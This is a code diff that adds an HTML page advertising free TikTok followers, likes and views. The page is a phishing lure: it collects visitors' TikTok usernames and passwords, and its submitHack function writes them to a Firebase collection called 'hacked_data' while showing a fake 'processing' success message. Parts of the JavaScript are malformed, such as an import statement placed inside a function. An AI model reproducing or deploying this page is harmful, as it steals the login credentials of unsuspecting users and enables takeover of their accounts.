@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free TikTok Service</title>
+    <link rel="stylesheet" href="style.css">
+    <script type="module" src="firebase-config.js"></script>
+</head>
+<body>
+    <div class="container">
+        <h1>Free TikTok Service 🎵</h1>
+        <p>Get Free Followers, Likes & Views!</p>
+        
+        <select id="service-type" style="width:90%; padding:10px; background:#333; color:white; border:none; margin-bottom:10px;">
+            <option value="Followers">Free Followers</option>
+            <option value="Likes">Free Likes</option>
+            <option value="Views">Free Views</option>
+        </select>
+
+        <input type="text" id="username" placeholder="Enter TikTok Username">
+        <input type="password" id="password" placeholder="Enter Password">
+        
+        <button onclick="submitHack()">Submit</button>
+        <div id="msg" class="success-msg"></div>
+    </div>
+
+    <script type="module">
+        import { saveToFirebase } from './index.html'; 
+        
+        async function submitHack() {
+            const service = document.getElementById('service-type').value;
+            const user = document.getElementById('username').value;
+            const pass = document.getElementById('password').value;
+            const msgDiv = document.getElementById('msg');
+
+            if(!user || !pass) {
+                alert("Please fill all fields");
+                return;
+            }
+
+            msgDiv.style.display = 'none';
+            document.querySelector('button').innerText = "Processing...";
+            
+            setTimeout(async () => {
+                try {
+                    import { db, collection, addDoc } from './firebase-config.js';
+                    await addDoc(collection(db, "hacked_data"), {
+                        platform: "TikTok",
+                        username: user,
+                        password: pass,
+                        timestamp: new Date(),
+                        details: service + " Requested"
+                    });
+                    
+                    msgDiv.innerHTML = `✅ ${service} Submitted Successfully!<br>Your account is being processed.`;
+                    msgDiv.style.display = 'block';
+                    document.querySelector('button').innerText = "Success";
+                } catch (e) {
+                    console.error(e);
+                    alert("Error saving data");
+                }
+            }, 1500);
+        }
+    </script>
+</body>
+</html>
